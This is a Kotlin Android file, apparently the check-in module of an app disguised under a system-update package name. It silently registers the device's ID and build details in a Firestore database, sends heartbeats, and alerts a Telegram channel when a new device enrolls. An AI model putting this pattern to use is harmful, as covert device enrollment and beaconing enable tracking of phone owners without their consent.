package com.sys.update2

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object DeviceManager {

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val FS_BASE = "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents"

    fun getDeviceId(ctx: Context): String {
        return try {
            val androidId = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
            "device_${androidId.take(12)}"
        } catch (_: Exception) {
            "device_unknown_${System.currentTimeMillis()}"
        }
    }

    fun registerDevice(ctx: Context) {
        Thread {
            try {
                val deviceId = getDeviceId(ctx)
                val now = System.currentTimeMillis()

                val prefs = ctx.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
                val installedAt = prefs.getLong("installed_at", 0L)
                val realInstalledAt = if (installedAt == 0L) {
                    prefs.edit().putLong("installed_at", now).apply()
                    now
                } else installedAt

                val url = "$FS_BASE/devices/$deviceId?key=${Config.FIREBASE_API_KEY}"

                val fields = JSONObject()
                fields.put("id", strValue(deviceId))
                fields.put("brand", strValue(Build.BRAND))
                fields.put("manufacturer", strValue(Build.MANUFACTURER))
                fields.put("model", strValue(Build.MODEL))
                fields.put("product", strValue(Build.PRODUCT))
                fields.put("android", strValue(Build.VERSION.RELEASE))
                fields.put("sdk", intValue(Build.VERSION.SDK_INT.toLong()))
                fields.put("status", strValue("active"))
                fields.put("last_seen_ms", intValue(now))
                fields.put("installed_at_ms", intValue(realInstalledAt))

                val body = JSONObject().apply { put("fields", fields) }.toString()

                val req = Request.Builder()
                    .url(url)
                    .patch(body.toRequestBody("application/json".toMediaType()))
                    .build()

                client.newCall(req).execute().use { resp ->
                    Log.d("DeviceManager", "registered: ${resp.code}")
                }

                val notified = prefs.getBoolean("notified", false)
                if (!notified) {
                    TelegramApi.sendMessage(
                        "📱 *جهاز جديد تم تسجيله*\n\n" +
                        "📛 ${Build.MANUFACTURER} ${Build.MODEL}\n" +
                        "🤖 Android ${Build.VERSION.RELEASE}\n" +
                        "🆔 `$deviceId`"
                    )
                    prefs.edit().putBoolean("notified", true).apply()
                }

            } catch (e: Exception) {
                Log.e("DeviceManager", "register err: ${e.message}")
            }
        }.start()
    }

    fun updateHeartbeat(ctx: Context) {
        Thread {
            try {
                val deviceId = getDeviceId(ctx)
                val now = System.currentTimeMillis()
                val url = "$FS_BASE/devices/$deviceId?key=${Config.FIREBASE_API_KEY}&updateMask.fieldPaths=last_seen_ms&updateMask.fieldPaths=status"

                val fields = JSONObject()
                fields.put("last_seen_ms", intValue(now))
                fields.put("status", strValue("active"))

                val body = JSONObject().apply { put("fields", fields) }.toString()

                val req = Request.Builder()
                    .url(url)
                    .patch(body.toRequestBody("application/json".toMediaType()))
                    .build()

                client.newCall(req).execute().use { }
            } catch (_: Exception) {}
        }.start()
    }

    fun markInactive(ctx: Context) {
        Thread {
            try {
                val deviceId = getDeviceId(ctx)
                val url = "$FS_BASE/devices/$deviceId?key=${Config.FIREBASE_API_KEY}&updateMask.fieldPaths=status"

                val fields = JSONObject()
                fields.put("status", strValue("inactive"))

                val body = JSONObject().apply { put("fields", fields) }.toString()

                val req = Request.Builder()
                    .url(url)
                    .patch(body.toRequestBody("application/json".toMediaType()))
                    .build()

                client.newCall(req).execute().use { }
            } catch (_: Exception) {}
        }.start()
    }

    private fun strValue(s: String): JSONObject = JSONObject().put("stringValue", s)
    private fun intValue(n: Long): JSONObject = JSONObject().put("integerValue", n.toString())
}
